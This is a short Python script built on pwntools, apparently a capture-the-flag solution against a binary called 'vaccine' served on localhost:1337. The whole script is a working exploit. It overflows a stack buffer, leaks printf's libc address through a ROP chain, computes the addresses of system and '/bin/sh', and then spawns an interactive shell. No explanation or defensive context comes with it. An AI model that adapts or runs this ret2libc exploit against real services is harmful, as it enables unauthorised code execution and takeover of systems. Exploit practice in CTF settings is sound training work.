from pwn import *
context.arch= "amd64"
elf = ELF("./vaccine")
libc = ELF("./libc-2.31.so")
system_offset = libc.symbols['printf'] - libc.symbols['system']
binsh_offset = libc.symbols['printf'] - next(libc.search(b"/bin/sh"))
puts = elf.symbols['puts']
printf_got = elf.symbols['got.printf']

pop_rdi = 0x401443
ret = 0x40101a

# p = elf.process()
p = remote("localhost",1337)
# Leak printf libc address and return to main
payload = p64(pop_rdi) + p64(printf_got) + p64(puts) + p64(elf.symbols['main'])

p.sendlineafter("Give me vaccine: ",b'A\x00'+b'P'*(98+12)+b'A\x00'+b'P'*(264-114)+payload)
p.recvuntil("your flag is in another castle\n")

# Calculate system and binsh libc address
printf_libc = u64(p.recvline()[:-1]+b'\x00\x00')
system = printf_libc - system_offset
binsh = printf_libc - binsh_offset
print(hex(printf_libc),hex(system),hex(binsh))

# Execute system("/bin/sh")
payload = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter("Give me vaccine:",b'A\x00'+b'P'*(98+12)+b'A\x00'+b'P'*(264-114)+payload)
p.interactive()